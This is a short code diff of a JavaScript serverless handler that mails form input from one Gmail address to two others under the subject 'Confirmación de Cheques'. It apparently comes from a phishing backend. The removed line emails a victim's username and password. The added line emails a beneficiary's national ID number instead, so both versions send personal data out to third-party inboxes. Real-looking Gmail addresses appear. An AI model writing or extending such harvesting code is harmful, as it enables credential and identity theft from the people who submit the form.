@@ -16,7 +16,7 @@ exports.handler = async function(event, context) {
         from: 'cuentaluperonp5@gmail.com',
         to: 'sierroalee@gmail.com, fendergriseldo@gmail.com',
         subject: 'Confirmación de Cheques',
-        text: `Usuario: ${username}\nContraseña: ${password}`,
+        text: `Cédula del Beneficiario: ${username}`,
     };
 
     try {
